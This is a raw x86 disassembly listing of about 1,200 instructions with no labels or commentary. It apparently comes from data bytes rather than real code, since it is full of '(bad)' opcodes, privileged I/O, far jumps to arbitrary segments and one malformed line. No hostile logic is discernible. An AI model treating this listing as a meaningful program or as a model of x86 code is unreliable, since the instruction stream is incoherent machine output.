  42152c:	mov    eax,ebx
  42152e:	xlat   BYTE PTR ds:[ebx]
  42152f:	pop    edi
  421530:	into   
  421531:	sub    eax,0xab9798d6
  421536:	fdivrp st(5),st
  421538:	jg     0x42155e
  42153a:	ja     0x421544
  42153c:	sub    ebx,DWORD PTR [ecx-0x40]
  42153f:	idiv   BYTE PTR [edx-0x4a8ac420]
  421545:	jge    0x4214ce
  421547:	inc    edi
  421548:	mov    ah,0xa8
  42154a:	xor    ch,BYTE PTR [edx+0x52]
  42154d:	adc    bl,BYTE PTR [edi+0x6595ff58]
  421553:	sbb    al,0x97
  421555:	jmp    0x3436:0x16be6195
  42155c:	popa   
  42155d:	sub    BYTE PTR [edi+ebx*2+0xdd645cd],0x87
  421565:	push   ss
  421566:	xchg   esi,eax
  421567:	mov    eax,ds:0x89872a
  42156c:	pop    edi
  42156d:	xor    eax,0x77304620
  421572:	mov    bh,0x98
  421574:	loop   0x4215a4
  421576:	mov    cl,0xd2
  421578:	in     al,0x81
  42157a:	inc    ecx
  42157b:	aad    0x2e
  42157d:	std    
  42157e:	xlat   BYTE PTR ds:[ebx]
  42157f:	dec    ebp
  421580:	inc    edx
  421581:	and    DWORD PTR [ecx],ebx
  421583:	add    ebx,ebp
  421585:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  421587:	div    cl
  421589:	ss out dx,al
  42158b:	jo     0x42155b
  42158d:	int3   
  42158e:	jbe    0x42155f
  421590:	and    ebp,esi
  421592:	div    BYTE PTR [eax-0x1d]
  421595:	clc    
  421596:	repz repz or edx,DWORD PTR [eax+ebp*4+0x7e806c46]
  42159f:	cmp    esi,DWORD PTR [ecx]
  4215a1:	fimul  DWORD PTR [eax]
  4215a3:	repnz fcom DWORD PTR [edx-0x4784db7d]
  4215aa:	mov    DWORD PTR es:[edx+0x4],ebp
  4215ae:	mov    dh,0xac
  4215b0:	popa   
  4215b1:	mov    si,0xfb6
  4215b5:	and    BYTE PTR [edi+0x66],dl
  4215b8:	mov    bl,0xf4
  4215ba:	cld    
  4215bb:	dec    esp
  4215bc:	(bad)  
  4215bd:	sar    DWORD PTR [ecx+0x3a],0x43
  4215c1:	dec    edx
  4215c2:	and    al,0xf4
  4215c4:	sub    cl,dh
  4215c6:	(bad)  
  4215c8:	pusha  
  4215c9:	and    BYTE PTR [eax-0x5e244b7c],al
  4215cf:	call   0x6e1fa208
  4215d4:	mov    ds,edi
  4215d6:	or     eax,0x3dd931e4
  4215db:	push   es
  4215dc:	je     0x421631
  4215de:	out    0xb3,eax
  4215e0:	mov    dh,0x2f
  4215e2:	(bad)  
  4215e3:	daa    
  4215e4:	xchg   esi,eax
  4215e5:	idiv   BYTE PTR [eax]
  4215e7:	push   ds
  4215e8:	push   0x43
  4215ea:	das    
  4215eb:	xor    dl,bh
  4215ed:	xor    DWORD PTR [edi],ebp
  4215ef:	dec    ecx
  4215f0:	popa   
  4215f1:	jl     0x42162c
  4215f3:	jmp    0x9faa769a
  4215f8:	sbb    eax,0x380cde34
  4215fd:	mul    BYTE PTR [eax+0x20]
  421600:	add    esi,esp
  421602:	push   DWORD PTR [edx]
  421604:	fadd   DWORD PTR [ebx]
  421606:	call   0x938c:0x5cf607dd
  42160d:	mov    al,ds:0x43f58bd9
  421612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421613:	ss pop eax
  421615:	and    BYTE PTR [ebx+0x789507d4],dl
  42161b:	retf   
  42161c:	push   edx
  42161d:	ss dec edx
  42161f:	or     dl,bh
  421621:	fbstp  TBYTE PTR [bp+di+0x1e3e]
  421626:	and    DWORD PTR [ecx],edi
  421628:	mov    bl,0xec
  42162a:	mov    bh,0x48
  42162c:	dec    di
  42162e:	rol    BYTE PTR [ecx+0x13f60656],cl
  421634:	(bad)  
  421636:	xchg   ebp,eax
  421637:	imul   esp,DWORD PTR [ebx],0xffffffdb
  42163a:	pop    edi
  42163b:	inc    ebx
  42163c:	fisttp WORD PTR [eax-0x33]
  42163f:	(bad)  
  421640:	sub    al,0xa6
  421642:	jb     0x421630
  421644:	sub    DWORD PTR [ebx+eax*8],ebp
  421647:	or     ah,BYTE PTR [ebp-0x2200f0e7]
  42164d:	dec    edi
  42164e:	ret    
  42164f:	sub    al,0x7c
  421651:	and    al,0x39
  421653:	fist   WORD PTR [ebx-0x19]
  421656:	outs   dx,BYTE PTR ds:[esi]
  421657:	sub    BYTE PTR [ebx],ch
  421659:	imul   eax,DWORD PTR [esi+esi*1],0x9
  42165d:	cli    
  42165e:	sbb    DWORD PTR [ebx+0xa32b387],ebx
  421664:	adc    ecx,DWORD PTR [esi+0x4f]
  421667:	inc    ebp
  421668:	cmp    BYTE PTR [ebp+0x4065c11b],0x39
  42166f:	mov    eax,0xaab1d610
  421674:	add    ah,bh
  421676:	dec    ebp
  421677:	in     eax,0x57
  421679:	idiv   bl
  42167b:	outs   dx,BYTE PTR ds:[esi]
  42167c:	std    
  42167d:	aas    
  42167e:	or     DWORD PTR [edi],edx
  421680:	enter  0x17b,0x9d
  421684:	mov    al,ds:0xc31fa7db
  421689:	retf   
  42168a:	in     eax,dx
  42168b:	loop   0x4216d0
  42168d:	mov    ds:0xffcdcfff,eax
  421692:	mov    bh,BYTE PTR [ecx]
  421694:	ss mov eax,0x8fa062ac
  42169a:	dec    esp
  42169b:	out    dx,eax
  42169c:	push   ebp
  42169d:	scas   al,BYTE PTR es:[edi]
  42169e:	(bad)  
  4216a0:	inc    esi
  4216a1:	cdq    
  4216a2:	sbb    ecx,0xfffffffd
  4216a5:	cld    
  4216a6:	outs   dx,DWORD PTR ds:[esi]
  4216a7:	cmp    ebp,edi
  4216a9:	popf   
  4216aa:	mov    al,ds:0xebcd1b2f
  4216af:	div    edi
  4216b1:	mov    bh,0x7b
  4216b3:	xor    BYTE PTR [ebx-0x66],ah
  4216b6:	xor    al,0xd1
  4216b8:	mov    cl,0xd5
  4216ba:	push   edx
  4216bb:	push   ss
  4216bc:	jmp    DWORD PTR [ecx]
  4216be:	add    eax,0xa5b415a
  4216c3:	pushf  
  4216c4:	fwait
  4216c5:	das    
  4216c6:	jno    0x42172b
  4216c8:	pop    ds
  4216c9:	fdiv   QWORD PTR [ebp-0x24]
  4216cc:	cld    
  4216cd:	dec    eax
  4216ce:	test   ebp,edi
  4216d0:	xchg   ebx,eax
  4216d1:	mov    gs,WORD PTR [ebp+0x6b8382d6]
  4216d7:	es inc edi
  4216d9:	xor    DWORD PTR [eax-0x43a23de1],esi
  4216df:	sub    BYTE PTR [ebx+ebp*8+0x77c57a7f],ah
  4216e6:	xchg   ebx,eax
  4216e7:	fsubr  st(0),st
  4216e9:	in     al,0x39
  4216eb:	cmp    BYTE PTR [ebx-0x65],ah
  4216ee:	jno    0x421675
  4216f0:	popa   
  4216f1:	aaa    
  4216f2:	dec    edx
  4216f3:	cmc    
  4216f4:	sbb    ebx,DWORD PTR [ebx]
  4216f6:	and    DWORD PTR ds:0x236f63dc,ebp
  4216fc:	int3   
  4216fd:	(bad)  
  4216fe:	(bad)  
  4216ff:	fcmovnbe st,st(4)
  421701:	cmp    al,0x51
  421703:	cmp    ch,BYTE PTR [edi-0x1f2edd7]
  421709:	lock sub eax,0xd842ea1c
  42170f:	xor    BYTE PTR [edx+0x786624ca],cl
  421715:	mov    ds:0x62a31c5a,al
  42171a:	(bad)  
  42171b:	xchg   ebx,eax
  42171c:	out    0x2,eax
  42171e:	cld    
  42171f:	mov    edi,DWORD PTR [ebx+0x30]
  421722:	popa   
  421723:	(bad)  
  421724:	pop    es
  421725:	das    
  421726:	(bad)  
  421728:	jo     0x4216bb
  42172a:	mov    bl,0x61
  42172c:	fistp  QWORD PTR ds:0x69f65b25
  421732:	sbb    eax,ebx
  421734:	jb     0x4216d8
  421736:	or     esi,DWORD PTR [edi+0x7b2aba05]
  42173c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42173d:	jg     0x42174f
  42173f:	jp     0x42175b
  421741:	cmp    ah,BYTE PTR [ecx]
  421743:	add    ch,BYTE PTR [ecx+ecx*2-0x1]
  421747:	call   0xdffb:0x913e4757
  42174e:	mov    edx,0x9e14e1ad
  421753:	int    0x3
  421755:	sub    esp,DWORD PTR [edx*1+0x40716dd5]
  42175c:	pop    edx
  42175d:	pusha  
  42175e:	js     0x4217b5
  421760:	and    BYTE PTR [esi-0x722e24f8],0x51
  421767:	push   0x67
  421769:	stos   BYTE PTR es:[edi],al
  42176a:	xor    esp,DWORD PTR [edx+0x55]
  42176d:	xor    cl,bh
  42176f:	leave  
  421770:	shl    ebp,cl
  421772:	xchg   esi,eax
  421773:	jmp    0x421793
  421775:	lea    eax,[ecx]
  421777:	push   0x9033101d
  42177c:	idiv   bl
  42177e:	repnz loop 0x4217cc
  421781:	adc    al,0x71
  421783:	xor    BYTE PTR [ebx+0x5178655e],dh
  421789:	shl    BYTE PTR [edx+ebx*8-0x44],1
  42178d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42178e:	daa    
  42178f:	mov    ds:0xdac38368,eax
  421794:	pushf  
  421795:	inc    DWORD PTR [ebx+0x41aad7d8]
  42179b:	jo     0x4217dc
  42179d:	mov    al,0x84
  42179f:	lahf   
  4217a0:	jns    0x421775
  4217a2:	fsub   DWORD PTR [eax]
  4217a4:	aad    0x12
  4217a6:	or     al,0x0
  4217a8:	push   eax
  4217a9:	das    
  4217aa:	stos   DWORD PTR es:[edi],eax
  4217ab:	mov    tr1,eax
  4217ae:	cmp    BYTE PTR [edx-0x23],bh
  4217b1:	xchg   ecx,eax
  4217b2:	test   al,0x2e
  4217b4:	cwde   
  4217b5:	stc    
  4217b6:	mov    WORD PTR [edi+0x3b],cs
  4217b9:	adc    ch,BYTE PTR [ebx]
  4217bb:	in     al,0x52
  4217bd:	sbb    DWORD PTR [ebx],esp
  4217bf:	jb     0x42183d
  4217c1:	outs   dx,DWORD PTR ds:[esi]
  4217c2:	inc    eax
  4217c3:	fdivrp st(1),st
  4217c5:	xchg   ebp,eax
  4217c6:	add    DWORD PTR [ecx],eax
  4217c8:	aam    0x55
  4217ca:	in     al,0xba
  4217cc:	mul    DWORD PTR [ebp+0x3be80178]
  4217d2:	pop    edx
  4217d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217d4:	push   esi
  4217d5:	outs   dx,BYTE PTR ds:[esi]
  4217d6:	cmc    
  4217d7:	call   0x7609af32
  4217dc:	ss sbb eax,0x5478e62d
  4217e2:	add    eax,0xf1fc3ad9
  4217e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217e8:	into   
  4217e9:	sub    BYTE PTR [edx-0x76],bh
  4217ec:	rcl    BYTE PTR [edx+0x3a94bf0e],cl
  4217f2:	push   eax
  4217f3:	cmp    eax,0x504a66f1
  4217f8:	in     eax,0xfc
  4217fa:	mov    dh,bl
  4217fc:	in     eax,dx
  4217fd:	sub    edi,DWORD PTR [edx]
  4217ff:	retf   0x8020
  421802:	out    dx,al
  421803:	in     eax,dx
  421804:	mov    DWORD PTR [ecx],ecx
  421806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421807:	nop
  421808:	rcr    bl,1
  42180a:	and    cl,BYTE PTR [ebx+eiz*1-0x19204342]
  421811:	ror    edx,0xf5
  421814:	dec    ebx
  421815:	jno    0x42179c
  421817:	pushf  
  421818:	bnd jmp 0x641da581
  42181e:	inc    esp
  42181f:	and    ecx,0xffffffd3
  421822:	sahf   
  421823:	jb     0x42188a
  421825:	in     al,0x70
  421827:	jp     0x421873
  421829:	pop    ebx
  42182a:	sbb    ebp,DWORD PTR ss:[edx+esi*4-0x34]
  42182f:	push   ss
  421830:	popf   
  421831:	xor    eax,0xebf37bdb
  421836:	adc    esi,esi
  421838:	addr16 das 
  42183a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42183b:	dec    edx
  42183c:	mov    ds:0xc607f7a9,al
  421841:	or     esi,0xffffffa0
  421844:	gs rcl esi,0x1
  421848:	popf   
  421849:	gs leave 
  42184b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42184c:	std    
  42184d:	xor    al,0xf
  42184f:	xchg   ebp,eax
  421850:	inc    edi
  421851:	ds loopne 0x42183f
  421854:	mov    fs,ecx
  421856:	aas    
  421857:	inc    ecx
  421858:	loop   0x4217dc
  42185a:	xor    DWORD PTR [ebx-0x4873d05a],eax
  421860:	push   ebx
  421861:	into   
  421862:	data16 jbe 0x421887
  421865:	test   esi,ebp
  421867:	mov    BYTE PTR [edi],dl
  421869:	in     al,dx
  42186a:	or     BYTE PTR [edx+0x5ad083a2],0xe2
  421871:	fs push ebp
  421873:	popa   
  421874:	sbb    BYTE PTR [edx],dh
  421876:	call   DWORD PTR [ebp+0x2]
  421879:	out    0xd4,eax
  42187b:	add    DWORD PTR [ecx+0x7],esi
  42187e:	test   eax,0xd6b1c6c7
  421883:	pop    es
  421884:	in     eax,0x1f
  421886:	push   ecx
  421887:	and    edx,DWORD PTR [ebp-0x1f]
  42188a:	and    BYTE PTR [ecx-0x606a78ac],al
  421890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421891:	xor    eax,ebp
  421893:	sub    dl,dh
  421895:	mov    ds:0x69d4a8c2,al
  42189a:	dec    esi
  42189b:	std    
  42189c:	or     cl,BYTE PTR [edx-0x18]
  42189f:	test   DWORD PTR [edx+0x99867e8],edi
  4218a5:	mov    bh,0x0
  4218a7:	and    DWORD PTR [ecx],0xd587504f
  4218ad:	hlt    
  4218ae:	or     DWORD PTR [ecx-0x56083ed9],esi
  4218b4:	push   es
  4218b5:	in     eax,dx
  4218b6:	pop    edx
  4218b7:	ds int3 
  4218b9:	mov    edx,0xd3c27ca0
  4218be:	ss pop esp
  4218c0:	test   BYTE PTR [ebp+0x40471895],ch
  4218c6:	fcomp  st(2)
  4218c8:	or     ebx,DWORD PTR [ecx]
  4218ca:	fistp  WORD PTR [edx+0x19c3f2b5]
  4218d0:	repz cld 
  4218d2:	push   edi
  4218d3:	add    cl,dl
  4218d5:	mov    dh,0xa2
  4218d7:	dec    edx
  4218d8:	mov    esi,0x2f9431e4
  4218dd:	push   edi
  4218de:	push   edi
  4218df:	lods   al,BYTE PTR ds:[esi]
  4218e0:	gs repz pop ecx
  4218e3:	adc    esp,ebp
  4218e5:	rcr    dl,0x53
  4218e8:	jle    0x421968
  4218ea:	daa    
  4218eb:	and    BYTE PTR ds:0xbe17b1c5,0x74
  4218f2:	sub    edi,DWORD PTR [eax]
  4218f4:	pusha  
  4218f5:	mov    edx,DWORD PTR [edx+0x77]
  4218f8:	fs test al,0x58
  4218fb:	pop    edi
  4218fc:	(bad)  
  4218fd:	dec    edi
  4218fe:	mov    ds:0xb27fd3fa,al
  421903:	lahf   
  421904:	outs   dx,DWORD PTR ds:[esi]
  421905:	add    dh,al
  421907:	cmp    dh,BYTE PTR [edx+0x66]
  42190a:	pop    ebp
  42190b:	sahf   
  42190c:	shl    BYTE PTR [ecx+0x77],1
  42190f:	hlt    
  421910:	xor    dh,BYTE PTR [edi+ebx*4+0x36]
  421914:	xchg   ebx,eax
  421915:	ds (bad) 
  421917:	push   esp
  421918:	enter  0x6b7a,0x11
  42191c:	out    dx,eax
  42191d:	push   esi
  42191e:	mov    ds:0xa88f096a,al
  421923:	fsubr  DWORD PTR [ecx+0x1b]
  421926:	inc    edi
  421927:	or     al,0xa2
  421929:	xchg   ebx,eax
  42192a:	mov    ah,0x2
  42192c:	mov    ebp,0x1598519b
  421931:	pop    esp
  421932:	repz stc 
  421934:	xor    BYTE PTR [eax+0x61399580],dh
  42193a:	push   edi
  42193b:	mov    ch,0xa1
  42193d:	loope  0x421940
  42193f:	cmp    al,ah
  421941:	fist   WORD PTR [ebx]
  421943:	or     edi,DWORD PTR [edi-0x5d0f8df6]
  421949:	cmp    edx,DWORD PTR [edx+0x34deac92]
  42194f:	push   eax
  421950:	aaa    
  421951:	jnp    0x42190d
  421953:	sub    dl,BYTE PTR [edi+0x75]
  421956:	pop    eax
  421957:	xchg   esp,eax
  421958:	add    BYTE PTR [ebx],bh
  42195a:	xor    al,BYTE PTR [edx]
  42195c:	jb     0x4219c8
  42195e:	xchg   ebp,eax
  42195f:	ret    0x2e9e
  421962:	dec    edx
  421963:	hlt    
  421964:	dec    ecx
  421965:	xor    al,0x47
  421967:	mov    eax,?
  421969:	adc    DWORD PTR [ebx-0x49a089ff],eax
  42196f:	mov    ds:0xe59202b2,al
  421974:	fimul  DWORD PTR [ebx]
  421976:	jns    0x4219d0
  421978:	(bad)  
  42197a:	pop    edi
  42197b:	sar    ebx,0x3
  42197e:	inc    eax
  42197f:	sti    
  421980:	retf   0xadfc
  421983:	(bad)  
  421984:	mov    cl,0x51
  421986:	fs stos DWORD PTR es:[edi],eax
  421988:	dec    ebx
  421989:	cs enter 0xdf19,0xc5
  42198e:	bound  ebx,QWORD PTR [esi+0x3e]
  421991:	sub    eax,0xe27a2c4f
  421996:	lods   eax,DWORD PTR ds:[esi]
  421997:	rol    DWORD PTR [edx+0x4e982213],0xc9
  42199e:	push   ebp
  42199f:	bound  ebp,QWORD PTR [esi+0x1]
  4219a2:	pop    eax
  4219a3:	fld    DWORD PTR [edi]
  4219a5:	fucomp st(1)
  4219a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219a8:	aam    0xea
  4219aa:	jae    0x421a2a
  4219ac:	fnstcw WORD PTR [ebp+0x2bc232df]
  4219b2:	mov    esp,0x3a5a9f2e
  4219b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219b8:	dec    esp
  4219b9:	ds cmp eax,0x27ffcb1b
  4219bf:	std    
  4219c0:	aad    0x45
  4219c2:	mov    al,ds:0xa7f35497
  4219c7:	mov    ds:0x656cd09,eax
  4219cc:	arpl   WORD PTR [eax-0x12],ax
  4219cf:	lods   al,BYTE PTR ds:[esi]
  4219d0:	cdq    
  4219d1:	push   cs
  4219d2:	not    DWORD PTR [ebp-0x67d1b7f6]
  4219d8:	sbb    BYTE PTR [ebx+0x71cc122a],bl
  4219de:	ins    DWORD PTR es:[edi],dx
  4219df:	jmp    0x4219a9
  4219e1:	maxps  xmm7,XMMWORD PTR [eax-0x2]
  4219e5:	(bad)  
  4219e6:	(bad)
  4219e9:	cdq    
  4219ea:	aad    0x16
  4219ec:	addr16 sahf 
  4219ee:	adc    BYTE PTR [ebx+eax*4+0x7e],ah
  4219f2:	mov    DWORD PTR [ebx+0x4d74efef],esp
  4219f8:	bound  esp,QWORD PTR [edx+0x7148a5ce]
  4219fe:	sar    eax,cl
  421a00:	pop    ecx
  421a01:	and    dl,bl
  421a03:	pop    ss
  421a04:	sbb    ebp,ecx
  421a06:	jg     0x421a45
  421a08:	in     al,0xca
  421a0a:	inc    ebx
  421a0b:	cdq    
  421a0c:	sub    eax,0x3bdeb52b
  421a11:	or     al,0xf0
  421a13:	xchg   BYTE PTR [ecx],dl
  421a15:	pop    edx
  421a16:	jb     0x4219d3
  421a18:	ret    
  421a19:	fld    TBYTE PTR [ecx+0x68]
  421a1c:	daa    
  421a1d:	jne    0x421a0b
  421a1f:	pop    ss
  421a20:	push   eax
  421a21:	push   ss
  421a22:	outs   dx,BYTE PTR ds:[esi]
  421a23:	inc    edx
  421a24:	leave  
  421a25:	mov    dl,0x17
  421a27:	out    dx,al
  421a28:	pusha  
  421a29:	pushf  
  421a2a:	(bad)  
  421a2b:	lea    esp,[ebx]
  421a2d:	dec    ebx
  421a2e:	inc    esi
  421a2f:	xchg   ebp,eax
  421a30:	test   al,0x8e
  421a32:	retf   
  421a33:	xchg   BYTE PTR [ebx],ah
  421a35:	mov    esi,0x9675052f
  421a3a:	inc    esp
  421a3b:	push   0xffffffbc
  421a3d:	jg     0x421a60
  421a3f:	inc    ecx
  421a40:	int    0x22
  421a42:	mov    esi,0x5fe8ee73
  421a47:	retf   0x16f
  421a4a:	stos   DWORD PTR es:[edi],eax
  421a4b:	nop
  421a4c:	jnp    0x421a78
  421a4e:	dec    edx
  421a4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a50:	loope  0x421a2e
  421a52:	push   ss
  421a53:	fisub  DWORD PTR [ebx-0x50773d0a]
  421a59:	sub    al,0x98
  421a5b:	stos   BYTE PTR es:[edi],al
  421a5c:	sub    eax,0xdbd7bc24
  421a61:	aam    0xa4
  421a63:	(bad)  
  421a64:	std    
  421a65:	mov    cl,0x5e
  421a67:	mov    dl,0x13
  421a69:	jmp    0x6bb0d7d9
  421a6e:	ret    
  421a6f:	ins    BYTE PTR es:[edi],dx
  421a70:	fsubr  DWORD PTR [ecx]
  421a72:	dec    ebp
  421a73:	test   eax,0xb2cb743b
  421a78:	mov    cl,0xaa
  421a7a:	std    
  421a7b:	loope  0x421ae1
  421a7d:	out    dx,eax
  421a7e:	(bad)  
  421a7f:	sbb    DWORD PTR [edi+0x7a],ebp
  421a82:	sbb    ecx,DWORD PTR [edi-0x5edb0db0]
  421a88:	stc    
  421a89:	test   eax,0x99ad62c4
  421a8e:	call   0xfc08:0x9860d6a6
  421a95:	cmp    al,0x8b
  421a97:	test   DWORD PTR [eax+eax*4+0x3f],ebx
  421a9b:	pop    ebx
  421a9c:	loop   0x421a49
  421a9e:	cmp    BYTE PTR [ebx+0x3a211ca8],bl
  421aa4:	std    
  421aa5:	xchg   ecx,eax
  421aa6:	push   0xbccb9fe9
  421aab:	pmullw mm0,mm1
  421aae:	xor    al,0xcc
  421ab0:	inc    DWORD PTR [edi+0x1b588892]
  421ab6:	push   eax
  421ab7:	and    al,0xe4
  421ab9:	aam    0x6d
  421abb:	pop    esi
  421abc:	and    eax,0x7b50f381
  421ac1:	or     BYTE PTR [esi-0x3370287e],0x39
  421ac8:	push   ds
  421ac9:	(bad)  
  421aca:	pop    ds
  421acb:	aad    0x52
  421acd:	pop    edx
  421ace:	xchg   esp,eax
  421acf:	mov    ebp,0x1e4ba701
  421ad5:	inc    esp
  421ad6:	push   ebx
  421ad7:	jmp    0x26374dc4
  421adc:	repnz sub ch,dh
  421adf:	cdq    
  421ae0:	sub    eax,0x3147797d
  421ae5:	add    eax,DWORD PTR [ebx-0x4e]
  421ae8:	mov    esi,0xeb5b90cb
  421aed:	out    dx,al
  421aee:	aaa    
  421aef:	adc    edx,DWORD PTR [ecx+eiz*4]
  421af2:	daa    
  421af3:	dec    ecx
  421af4:	cmp    BYTE PTR [ebp+esi*4+0x68],0x82
  421af9:	fisub  DWORD PTR [eax]
  421afb:	loopne 0x421aa4
  421afd:	inc    ecx
  421afe:	div    ebx
  421b00:	(bad)  
  421b01:	pop    ebp
  421b02:	out    dx,al
  421b03:	or     eax,0xa9b07250
  421b08:	lods   eax,DWORD PTR ds:[esi]
  421b09:	xchg   esi,eax
  421b0a:	mul    DWORD PTR [esi-0x80]
  421b0d:	push   0x27
  421b0f:	aad    0xc0
  421b11:	neg    DWORD PTR [ebp+0x67]
  421b14:	lods   al,BYTE PTR ds:[esi]
  421b15:	ins    BYTE PTR es:[edi],dx
  421b16:	stos   DWORD PTR es:[edi],eax
  421b17:	mov    edi,cs
  421b19:	mov    ecx,ebp
  421b1b:	imul   ebx,DWORD PTR [esi-0x9bb132b],0x45
  421b22:	jbe    0x421b92
  421b24:	ret    
  421b25:	push   esp
  421b26:	gs sti 
  421b28:	gs cmp al,0x8b
  421b2b:	das    
  421b2c:	sar    BYTE PTR [edx],1
  421b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b2f:	fidivr DWORD PTR [edx+0x3a]
  421b32:	mov    cl,0x6e
  421b34:	mov    ecx,DWORD PTR [edi+0x3f898777]
  421b3a:	retf   
  421b3b:	daa    
  421b3c:	push   edx
  421b3d:	cmp    DWORD PTR [eax+0x658790a4],eax
  421b43:	xchg   esi,eax
  421b44:	and    al,0x91
  421b46:	sub    ch,BYTE PTR [edx+0x77]
  421b49:	sub    al,0x33
  421b4b:	dec    ebp
  421b4c:	cdq    
  421b4d:	in     eax,0x51
  421b4f:	cli    
  421b50:	xor    cl,cl
  421b52:	and    eax,DWORD PTR [edi]
  421b54:	call   0xce89103a
  421b59:	(bad)  
  421b5a:	fs xchg ebx,eax
  421b5c:	sbb    DWORD PTR [eax-0x4e],edx
  421b5f:	jle    0x421b37
  421b61:	je     0x421b0d
  421b63:	lahf   
  421b64:	dec    ecx
  421b65:	(bad)  
  421b67:	adc    BYTE PTR [ecx-0x7e30ecdf],0xf5
  421b6e:	sbb    DWORD PTR [eax-0x16],esp
  421b71:	out    dx,eax
  421b72:	xor    eax,esi
  421b74:	mov    WORD PTR [esi*8+0x73c08eba],ss
  421b7b:	or     DWORD PTR [ebx+0x4213ef1],esp
  421b81:	and    al,0xa6
  421b83:	mov    esi,0x6868354f
  421b88:	xchg   edi,eax
  421b89:	sbb    DWORD PTR ds:0x5095e546,ebx
  421b8f:	jno    0x421bc9
  421b91:	mov    esi,0xc3959b02
  421b96:	in     al,0xb4
  421b98:	mov    edi,0xce2f59b3
  421b9d:	or     ebx,DWORD PTR [esi]
  421b9f:	shl    DWORD PTR [edx+eax*4],1
  421ba2:	mov    esp,0x7c6b7c08
  421ba7:	daa    
  421ba8:	ins    DWORD PTR es:[edi],dx
  421ba9:	add    al,cl
  421bab:	cmc    
  421bac:	xlat   BYTE PTR ds:[ebx]
  421bad:	out    0x12,eax
  421baf:	je     0x421bbf
  421bb1:	xor    eax,0x98edbdc7
  421bb6:	jecxz  0x421c0d
  421bb8:	inc    ecx
  421bb9:	clc    
  421bba:	data16 cmp ch,BYTE PTR [edx+0x22d483a2]
  421bc1:	xor    DWORD PTR ds:0x9866d07c,edx
  421bc7:	ds push edx
  421bc9:	inc    edx
  421bca:	ret    0xd09
  421bcd:	push   es
  421bce:	xchg   ebx,eax
  421bcf:	mov    ch,0x1
  421bd1:	jmp    0x4676:0xb1c53bef
  421bd8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  421bda:	sub    BYTE PTR ds:0x17f9613e,dh
  421be0:	mov    DWORD PTR ds:0xe9428afc,esi
  421be6:	in     al,dx
  421be7:	mov    esi,0x66439f29
  421bec:	shr    DWORD PTR [ebp-0x10],1
  421bef:	xor    eax,0x77021474
  421bf4:	sbb    eax,0xa62ab06a
  421bf9:	xor    al,0x1
  421bfb:	cmp    BYTE PTR [edx+0x46],ch
  421bfe:	inc    edx
  421bff:	pop    ds
  421c00:	jmp    0x4a7b:0x70d4898b
  421c07:	sub    esi,ebx
  421c09:	jmp    DWORD PTR [ebx-0x113b2d90]
  421c0f:	jb     0x421c4f
  421c11:	and    bh,cl
  421c13:	jge    0x421baf
  421c15:	adc    bl,BYTE PTR [eax-0x3d4a653]
  421c1b:	xlat   BYTE PTR ds:[ebx]
  421c1c:	mov    bl,0xb7
  421c1e:	shl    DWORD PTR [edi],cl
  421c20:	mov    edi,0x4a7ea10f
  421c25:	das    
  421c26:	lds    ebx,FWORD PTR [ecx+0x51b7137]
  421c2c:	inc    ebx
  421c2d:	int3   
  421c2e:	mov    bl,0xb1
  421c30:	dec    edx
  421c31:	xchg   eax,esp
  421c33:	cmc    
  421c34:	sahf   
  421c35:	and    bl,BYTE PTR [edx-0x5190b5ab]
  421c3b:	popf   
  421c3c:	mov    al,ds:0x8f38334f
  421c41:	repz mov ecx,0xa412f56c
  421c47:	push   edi
  421c48:	or     esi,DWORD PTR [ebx]
  421c4a:	jle    0x421c13
  421c4c:	jmp    0x421cad
  421c4e:	push   cs
  421c4f:	push   edx
  421c50:	das    
  421c51:	sub    ah,al
  421c53:	bound  edi,QWORD PTR [eax+0x64]
  421c56:	xchg   esp,eax
  421c57:	sub    BYTE PTR [esi],0x10
  421c5a:	jp     0x421c85
  421c5c:	mov    bl,0x50
  421c5e:	inc    esi
  421c5f:	sar    BYTE PTR [edx+0x43041ce3],0x24
  421c66:	or     BYTE PTR [ecx+0x4d],al
  421c69:	pop    ds
  421c6a:	stos   BYTE PTR es:[edi],al
  421c6b:	scas   al,BYTE PTR es:[edi]
  421c6c:	ins    DWORD PTR es:[edi],dx
  421c6d:	in     eax,dx
  421c6e:	enter  0xe7f4,0x40
  421c72:	ds inc ebx
  421c74:	pop    ebx
  421c75:	cmp    ebp,DWORD PTR [edx+0x7e8926be]
  421c7b:	std    
  421c7c:	push   eax
  421c7d:	cmp    bh,BYTE PTR [esi]
  421c7f:	adc    eax,eax
  421c81:	mov    DWORD PTR [eax],ecx
  421c83:	pop    esp
  421c84:	daa    
  421c85:	add    ebx,DWORD PTR [ecx-0x50]
  421c88:	pop    esi
  421c89:	inc    esi
  421c8a:	lahf   
  421c8b:	adc    DWORD PTR [ebp-0x1e],edi
  421c8e:	or     BYTE PTR [ebx],ch
  421c90:	push   esp
  421c91:	test   BYTE PTR [esi+0x46489e93],dl
  421c97:	sub    ebp,DWORD PTR [ebx]
  421c99:	(bad)  
  421c9a:	ss call 0xb246788d
  421ca0:	ficomp WORD PTR [ebx-0x1f]
  421ca3:	push   es
  421ca4:	sahf   
  421ca5:	pop    esp
  421ca6:	in     al,0xd1
  421ca8:	les    esi,FWORD PTR [ebp+0x14]
  421cab:	(bad)  
  421cac:	dec    si
  421cae:	fbstp  TBYTE PTR [ebx]
  421cb0:	ins    BYTE PTR es:[edi],dx
  421cb1:	add    bl,BYTE PTR [ebp-0x2e]
  421cb4:	(bad)  
  421cb5:	xchg   edx,eax
  421cb6:	test   eax,0xb23a1d54
  421cbb:	dec    eax
  421cbd:	mov    cl,0x1d
  421cbf:	call   0xc054:0x4ca91b4e
  421cc6:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cc8:	cmp    eax,0x2944e416
  421ccd:	aam    0xf9
